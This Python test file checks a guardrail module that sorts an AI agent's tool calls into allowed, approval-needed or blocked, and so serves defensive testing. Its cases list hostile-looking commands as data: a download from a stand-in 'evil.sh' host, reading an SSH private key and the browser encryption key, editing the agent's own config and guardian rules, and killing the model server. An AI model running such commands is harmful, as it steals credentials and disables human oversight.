import rules
H = rules.HOME
CASES = [
  # (tool, args, expected action or None)
  ("terminal", {"command": "ls -la ~/Documents"}, None),
  ("terminal", {"command": "df -h /"}, None),
  ("terminal", {"command": "nvidia-smi"}, None),
  ("terminal", {"command": "cat ~/.bashrc"}, None),
  ("terminal", {"command": "sudo apt install vlc"}, "approve"),
  ("terminal", {"command": "echo hi && sudo reboot"}, "approve"),
  ("terminal", {"command": "apt-get install -y ffmpeg"}, "approve"),
  ("terminal", {"command": "pip install requests"}, "approve"),
  ("terminal", {"command": "npm i -g something"}, "approve"),
  ("terminal", {"command": "rm /home/alex/Documents/taxes.pdf"}, "block"),
  ("terminal", {"command": "rm /var/lib/clara/workspace/tmp.txt"}, None),
  ("terminal", {"command": "rm -rf /tmp/scratch"}, None),
  ("terminal", {"command": "rm /var/lib/clara/workspace/*.txt"}, None),
  ("terminal", {"command": "mv /var/lib/clara/Downloads/a.zip /var/lib/clara/workspace/"}, None),
  ("terminal", {"command": "find /var/lib/clara/Downloads -mtime +180 -delete"}, None),
  ("terminal", {"command": "echo body | mail -s hi landlord@example.com"}, "approve"),
  ("terminal", {"command": "ssh me@server uptime"}, "approve"),
  ("terminal", {"command": "git push origin main"}, "approve"),
  ("terminal", {"command": "git status"}, None),
  ("terminal", {"command": "pkill -f firefox"}, "approve"),
  ("terminal", {"command": "systemctl restart docker"}, "approve"),
  ("terminal", {"command": "systemctl status docker"}, None),
  ("terminal", {"command": "crontab -e"}, "approve"),
  ("terminal", {"command": "curl -sf https://example.com"}, None),
  ("terminal", {"command": "curl -o ~/x.sh https://evil.sh"}, "approve"),
  ("terminal", {"command": "cat /var/lib/clara/hermes-home/config.yaml"}, "block"),
  ("terminal", {"command": "sed -i s/manual/off/ /var/lib/clara/hermes-home/config.yaml"}, "block"),
  ("terminal", {"command": "docker ps"}, None),
  ("terminal", {"command": "docker rm -f clara-searxng"}, "block"),
  ("write_file", {"path": "/var/lib/clara/workspace/report.md", "content": "hi"}, None),
  ("write_file", {"path": "/tmp/x.txt", "content": "hi"}, None),
  ("write_file", {"path": "/var/lib/clara/notes.txt", "content": "hi"}, None),
  ("write_file", {"path": "/etc/hosts", "content": "x"}, "approve"),
  ("write_file", {"path": "/var/lib/clara/hermes-home/config.yaml", "content": "x"}, "block"),
  ("patch", {"path": "/var/lib/clara/hermes-home/plugins/clara-guardian/rules.py"}, "block"),
  ("write_file", {"path": "/var/lib/clara/workspace/../hermes-home/.env", "content": "x"}, "block"),
  ("execute_code", {"code": "print(sum(range(10)))"}, None),
  ("execute_code", {"code": "import smtplib\ns=smtplib.SMTP('x')"}, "approve"),
  ("execute_code", {"code": "import shutil; shutil.rmtree('/home/x')"}, "block"),
  ("execute_code", {"code": "import subprocess; subprocess.run(['sudo','ls'])"}, "approve"),
  ("execute_code", {"code": "import requests; requests.get('https://x.com')"}, None),
  ("execute_code", {"code": "import requests; requests.post('https://x.com', data=1)"}, "approve"),
  ("browser_type", {"ref": "@e3", "text": "4111 1111 1111 1111"}, "block"),
  ("browser_type", {"ref": "@e3", "text": "cheap flights"}, None),
  ("browser_navigate", {"url": "https://example.com"}, None),
  ("web_search", {"query": "weather"}, None),
]
import subprocess
_llama = subprocess.run(["pgrep", "-f", "bin/cuda/llama-server"], capture_output=True, text=True).stdout.split()
_other = subprocess.Popen(["sleep", "60"])
CASES += [
  ("terminal", {"command": "pkill -f llama-server"}, "block"),
  ("terminal", {"command": "killall hermes"}, "block"),
  ("terminal", {"command": "docker stop clara-searxng"}, "block"),
  ("terminal", {"command": f"kill {_other.pid}"}, "approve"),
  ("terminal", {"command": "kill -9 1234567"}, "approve"),
]
if _llama:
    CASES += [("terminal", {"command": f"kill {_llama[0]} 2>/dev/null; sleep 2"}, "block"),
              ("terminal", {"command": f"kill -9 {_llama[0]}"}, "block")]
CASES += [
  ("terminal", {"command": "agent-browser get value '#password'"}, "block"),
  ("terminal", {"command": "cat /var/lib/clara/.agent-browser/.encryption-key"}, "block"),
  ("terminal", {"command": "ls ~/.agent-browser/auth"}, "block"),
  ("execute_code", {"code": "import subprocess; subprocess.run(['agent-browser','auth','list'])"}, "block"),
  ("browser_console", {}, None),
  ("browser_console", {"expression": "document.querySelector('#password').value"}, "approve"),
  ("browser_cdp", {"method": "Runtime.evaluate"}, "approve"),
  ("sign_in", {"name": "GitHub"}, None),
]
fails = 0
for tool, args, want in CASES:
    got = rules.decide(tool, args); got = got[0] if got else None
    if got != want:
        fails += 1; print(f"FAIL {tool} {args} -> {got}, expected {want}")
print(f"{len(CASES)-fails}/{len(CASES)} passed")

extra = [("terminal", {"command": "cat /home/alex/.ssh/id_rsa"}, "block"), ("terminal", {"command": "ls /srv/clara-state"}, "block"),
         ("terminal", {"command": "rm -rf /var/lib/clara/workspace/old"}, None)]
bad = [(t, a, w, (rules.decide(t, a) or [None])[0]) for t, a, w in extra if (rules.decide(t, a) or [None])[0] != w]
print("new-layout extras:", "all passed" if not bad else bad)
